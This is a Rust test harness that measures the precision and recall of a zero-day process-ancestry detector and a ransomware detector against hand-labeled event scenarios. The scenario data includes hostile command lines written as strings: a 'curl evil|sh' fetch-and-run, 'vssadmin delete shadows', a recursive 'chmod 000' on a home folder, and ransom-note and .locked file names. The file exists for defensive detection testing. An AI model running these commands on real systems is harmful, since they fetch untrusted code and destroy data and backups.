//! Labeled detection corpus — a small, extensible precision/recall harness.
//!
//! The point of a detection product is measurable efficacy: how often does it
//! catch the real thing, and how often does it fire on benign activity? This
//! harness encodes that as a table of hand-verified scenarios and a runner that
//! computes precision/recall, so a change that quietly regresses detection (or
//! re-introduces a false-positive) fails CI instead of shipping.
//!
//! The metric deliberately keys on the **high-confidence tier** — the threshold
//! at or above which a detection can trigger a *destructive* auto-response
//! (KillProcess / Quarantine / Isolate; see `zeroday::tier` and
//! `response` thresholds). A detector that merely *alerts* on a weak signal is
//! not a false positive here; one that would *auto-act* on benign activity is.
//! That is the error that actually causes harm on a real fleet, and it is the
//! exact class of bug the zeroday confidence-tiering fixed.
//!
//! Extending it: add scenarios to `zeroday_scenarios()`, or add a sibling
//! `<module>_scenarios()` + test for another detector. Keep every scenario
//! hand-verified so the asserted precision/recall stays at 1.0 — a drop means a
//! real regression, not a flaky test.

use crate::ransomware::RansomwareDetector;
use crate::types::{EventType, RawEvent};
use crate::zeroday::ZeroDayDetector;
use chrono::Utc;
use std::collections::HashMap;
use uuid::Uuid;

/// Confidence at/above which a detection can drive a destructive auto-response.
/// Matches `zeroday::tier`'s KillProcess cutoff and the response engine's
/// default `auto_kill_threshold` neighbourhood.
const HIGH_CONF: f32 = 90.0;

/// A labeled scenario: a sequence of events and whether a high-confidence
/// detection (one that could trigger a destructive auto-response) is correct.
struct Scenario {
    name: &'static str,
    events: Vec<RawEvent>,
    /// `true`  — a real threat that SHOULD reach the high-confidence tier.
    /// `false` — benign, OR a deliberately low-confidence weak signal, that must
    ///           NOT reach high confidence (so it can never auto-kill).
    expect_high_conf: bool,
}

fn exec(pid: u32, ppid: u32, name: &str, cmd: &str) -> RawEvent {
    RawEvent {
        id: Uuid::new_v4().to_string(),
        agent_id: "corpus".into(),
        hostname: "host".into(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessExec,
        pid,
        ppid,
        uid: 0,
        gid: 0,
        process_name: name.into(),
        process_path: None,
        command_line: Some(cmd.into()),
        parent_process: None,
        file_path: None,
        file_hash: None,
        network_dest_ip: None,
        network_dest_port: None,
        network_proto: None,
        syscall: None,
        return_code: None,
        container_id: None,
        namespace: None,
        extra: HashMap::new(),
    }
}

/// A parent exec followed by a child exec whose ppid resolves to the parent —
/// the shape the zeroday ancestry rules key on.
fn lineage(parent: &str, child: &str, child_cmd: &str) -> Vec<RawEvent> {
    vec![exec(100, 1, parent, parent), exec(200, 100, child, child_cmd)]
}

/// A file-write event by `pid`/`process_name` touching `path`. Built from `exec`
/// so every unrelated field keeps the same benign default, then re-typed as a
/// write with a file path and no command line (the ransomware file checks key on
/// `file_path`, not `command_line`).
fn file_write(pid: u32, process_name: &str, path: &str) -> RawEvent {
    let mut e = exec(pid, 1, process_name, "");
    e.event_type = EventType::FileWrite;
    e.file_path = Some(path.into());
    e.command_line = None;
    e
}

fn zeroday_scenarios() -> Vec<Scenario> {
    vec![
        // ── True positives: server/DB/viewer compromise → should auto-act ──
        Scenario { name: "nginx spawns bash (webshell)", events: lineage("nginx", "bash", "bash -c id"), expect_high_conf: true },
        Scenario { name: "mysqld spawns sh (UDF/injection)", events: lineage("mysqld", "sh", "sh -c whoami"), expect_high_conf: true },
        Scenario { name: "php-fpm spawns sh (webshell)", events: lineage("php-fpm", "sh", "sh -i"), expect_high_conf: true },
        Scenario { name: "evince spawns bash (malicious PDF)", events: lineage("evince", "bash", "bash -c curl evil|sh"), expect_high_conf: true },
        // ── Benign / weak signals: must NOT reach the auto-kill tier ──
        Scenario { name: "python spawns bash (routine automation)", events: lineage("python", "bash", "bash deploy.sh"), expect_high_conf: false },
        Scenario { name: "node spawns sh (build tooling)", events: lineage("node", "sh", "sh -c 'npm run build'"), expect_high_conf: false },
        Scenario { name: "sshd spawns interactive bash (normal login)", events: lineage("sshd", "bash", "bash -i"), expect_high_conf: false },
        Scenario { name: "bash spawns ls (ordinary)", events: lineage("bash", "ls", "ls -la"), expect_high_conf: false },
        Scenario { name: "systemd starts nginx (service start)", events: lineage("systemd", "nginx", "nginx"), expect_high_conf: false },
        Scenario { name: "make spawns gcc (build)", events: lineage("make", "gcc", "gcc -c main.c"), expect_high_conf: false },
    ]
}

/// Highest detection confidence the zeroday detector assigns across a scenario's
/// events (None if it never fires). A fresh detector per scenario keeps the
/// process-ancestry cache isolated.
async fn zeroday_peak_confidence(events: &[RawEvent]) -> Option<f32> {
    let d = ZeroDayDetector::new("corpus", "host");
    let mut peak: Option<f32> = None;
    for e in events {
        if let Some(t) = d.analyze(e).await {
            peak = Some(peak.map_or(t.confidence, |m| m.max(t.confidence)));
        }
    }
    peak
}

#[tokio::test]
async fn zeroday_corpus_precision_recall() {
    let scenarios = zeroday_scenarios();
    let (mut tp, mut fp, mut tn, mut fn_) = (0u32, 0u32, 0u32, 0u32);

    for s in &scenarios {
        let got_high = zeroday_peak_confidence(&s.events)
            .await
            .map(|c| c >= HIGH_CONF)
            .unwrap_or(false);
        match (s.expect_high_conf, got_high) {
            (true, true) => tp += 1,
            (false, false) => tn += 1,
            (true, false) => {
                fn_ += 1;
                eprintln!("  FALSE NEGATIVE — missed real threat: {}", s.name);
            }
            (false, true) => {
                fp += 1;
                eprintln!("  FALSE POSITIVE — would auto-act on benign: {}", s.name);
            }
        }
    }

    let precision = if tp + fp == 0 { 1.0 } else { tp as f64 / (tp + fp) as f64 };
    let recall = if tp + fn_ == 0 { 1.0 } else { tp as f64 / (tp + fn_) as f64 };
    eprintln!(
        "zeroday corpus: TP={tp} FP={fp} TN={tn} FN={fn_} | precision={precision:.3} recall={recall:.3}"
    );

    // The seed corpus is hand-verified, so both must be perfect. A regression —
    // e.g. re-flattening the confidence tiers so `python → bash` auto-kills, or
    // dropping a real server-compromise pattern — breaks one of these.
    assert_eq!(fp, 0, "high-confidence detection on a benign/weak scenario (would auto-act)");
    assert_eq!(fn_, 0, "missed a real high-confidence threat");
}

// ─────────────────────────────────────────────────────────────────────────────
// Ransomware corpus
//
// Only the *deterministic* ransomware detections are encoded here — the ones
// whose verdict depends purely on the event, not on real on-disk file entropy,
// wall-clock write rate, or the 30s background sweeper. (The mass-high-entropy
// and rate-based paths read actual files and real elapsed time, so they can't be
// asserted hermetically and are deliberately excluded.) Every true positive is a
// known pre-encryption / encryption / recovery-inhibition indicator; every
// benign case stays below the auto-kill tier.
// ─────────────────────────────────────────────────────────────────────────────

fn ransomware_scenarios() -> Vec<Scenario> {
    vec![
        // ── True positives: should reach the auto-response tier ──
        Scenario {
            name: "ransom note HOW_TO_DECRYPT.txt created (96.0)",
            events: vec![file_write(300, "cryptor", "/home/alice/HOW_TO_DECRYPT.txt")],
            expect_high_conf: true,
        },
        Scenario {
            name: "three files with a known ransom extension (.locked, 97.0)",
            events: vec![
                file_write(301, "cryptor", "/home/alice/a.docx.locked"),
                file_write(301, "cryptor", "/home/alice/b.xlsx.locked"),
                file_write(301, "cryptor", "/home/alice/c.pdf.locked"),
            ],
            expect_high_conf: true,
        },
        Scenario {
            name: "vssadmin deletes shadow copies (recovery inhibition, 93.0)",
            events: vec![exec(302, 1, "vssadmin", "vssadmin delete shadows /all /quiet")],
            expect_high_conf: true,
        },
        Scenario {
            name: "mass chmod 000 on /home (destruction, 90.0)",
            events: vec![exec(303, 1, "chmod", "chmod -R 000 /home/alice")],
            expect_high_conf: true,
        },
        Scenario {
            // A generic note name (README.txt) is normally alert-only, but once
            // the SAME process has written a known-ransom-extension file it is
            // corroborated and escalates to the auto-kill tier.
            name: "generic note README.txt corroborated by a .locked write (96.0)",
            events: vec![
                file_write(309, "cryptor", "/home/alice/notes.docx.locked"),
                file_write(309, "cryptor", "/home/alice/README.txt"),
            ],
            expect_high_conf: true,
        },
        // ── Benign / weak: must NOT reach the auto-kill tier ──
        Scenario {
            // The flagged false-positive: a bare README.txt (git clone, tarball,
            // installer) must stay an alert, never auto-kill.
            name: "benign README.txt alone (generic note, uncorroborated → alert 70.0)",
            events: vec![file_write(310, "git", "/home/alice/repo/README.txt")],
            expect_high_conf: false,
        },
        Scenario {
            name: "benign NOTICE.txt alone (generic note → alert)",
            events: vec![file_write(311, "tar", "/home/alice/pkg/NOTICE.txt")],
            expect_high_conf: false,
        },
        Scenario {
            name: "backup service stopped (pre-encryption signal, alert-only 82.0)",
            events: vec![exec(304, 1, "systemctl", "systemctl stop veeam")],
            expect_high_conf: false,
        },
        Scenario {
            name: "ordinary document save (no indicator)",
            events: vec![file_write(305, "libreoffice", "/home/alice/report.pdf")],
            expect_high_conf: false,
        },
        Scenario {
            name: "service writes its config (no indicator)",
            events: vec![file_write(306, "app", "/etc/app/config.yaml")],
            expect_high_conf: false,
        },
        Scenario {
            name: "build emits object files (benign, not a ransom extension)",
            events: vec![
                file_write(307, "cc1", "/home/alice/proj/parser.o"),
                file_write(307, "cc1", "/home/alice/proj/lexer.o"),
                file_write(307, "cc1", "/home/alice/proj/main.o"),
            ],
            expect_high_conf: false,
        },
        Scenario {
            name: "routine process exec (ls)",
            events: vec![exec(308, 1, "ls", "ls -la /home/alice")],
            expect_high_conf: false,
        },
    ]
}

/// Highest confidence the ransomware detector assigns across a scenario's events
/// (None if it never fires). A fresh detector per scenario keeps the per-pid file
/// activity isolated; the returned mpsc receiver is dropped (unused here).
async fn ransomware_peak_confidence(events: &[RawEvent]) -> Option<f32> {
    let (d, _rx) = RansomwareDetector::new("corpus", "host");
    let mut peak: Option<f32> = None;
    for e in events {
        if let Some(t) = d.analyze(e).await {
            peak = Some(peak.map_or(t.confidence, |m| m.max(t.confidence)));
        }
    }
    peak
}

#[tokio::test]
async fn ransomware_corpus_precision_recall() {
    let scenarios = ransomware_scenarios();
    let (mut tp, mut fp, mut tn, mut fn_) = (0u32, 0u32, 0u32, 0u32);

    for s in &scenarios {
        let got_high = ransomware_peak_confidence(&s.events)
            .await
            .map(|c| c >= HIGH_CONF)
            .unwrap_or(false);
        match (s.expect_high_conf, got_high) {
            (true, true) => tp += 1,
            (false, false) => tn += 1,
            (true, false) => {
                fn_ += 1;
                eprintln!("  FALSE NEGATIVE — missed real threat: {}", s.name);
            }
            (false, true) => {
                fp += 1;
                eprintln!("  FALSE POSITIVE — would auto-act on benign: {}", s.name);
            }
        }
    }

    let precision = if tp + fp == 0 { 1.0 } else { tp as f64 / (tp + fp) as f64 };
    let recall = if tp + fn_ == 0 { 1.0 } else { tp as f64 / (tp + fn_) as f64 };
    eprintln!(
        "ransomware corpus: TP={tp} FP={fp} TN={tn} FN={fn_} | precision={precision:.3} recall={recall:.3}"
    );

    assert_eq!(fp, 0, "high-confidence ransomware detection on a benign scenario (would auto-act)");
    assert_eq!(fn_, 0, "missed a real high-confidence ransomware threat");
}
